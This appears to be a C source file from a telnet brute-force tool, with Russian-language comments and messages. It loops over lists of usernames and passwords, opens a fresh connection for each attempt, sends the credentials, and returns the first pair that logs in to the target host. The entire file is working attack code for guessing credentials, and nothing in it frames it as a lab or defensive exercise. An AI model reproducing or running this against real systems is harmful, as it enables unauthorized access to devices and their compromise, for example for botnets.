#include "include/includes.h"
#include "bruteforce_functions/wait_for_prompt.c"
#include "bruteforce_functions/socket_things.c"
#include "bruteforce_functions/login_things.c"

char* telnet_login(const char *host) {
    static char result[256];
    char buffer[TELNET_MAX_BUFFER];
    int sock;
    struct sockaddr_in server;

    printf("Пытаемся войти на %s...\n", host);

    for (const char **username = usernames; *username != NULL; username++) {
        for (const char **password = passwords; *password != NULL; password++) {
            // Открываем новое соединение для каждой попытки
            sock = create_socket(host, &server);
            if (sock < 0) {
                printf("Не удалось установить соединение\n");
                continue;
            }

            printf("Соединение установлено\n");

            if (!wait_for_prompt(sock)) {
                close_socket(sock, "");
                continue;
            }

            printf("Пытаемся войти с %s\n", *username);
            sleep(3);
            send_username(sock, *username);

            if (!wait_for_prompt(sock)) {
                close_socket(sock, "");
                continue;
            }

            printf("Пытаемся войти с паролем %s\n", *password);
            sleep(2);
            send_password(sock, *password);

            printf("Подождали. Проверяем успешность входа\n");
            sleep(5);
            if (check_login_success(sock, buffer)) {
                snprintf(result, sizeof(result), "%s:%s", *username, *password);
                close_socket(sock, "");
                return result;
            }

            // Закрываем соединение после каждой попытки
            close_socket(sock, "");
        }
    }

    return "";
}

int telnet_brute() {
    char *credentials = telnet_login(TELNET_HOST);
    
    if (strlen(credentials) > 0) {
        printf("Успешный вход: %s\n", credentials);
    } else {
        printf("Не удалось войти на %s\n", TELNET_HOST);
    }

    return 0;
}
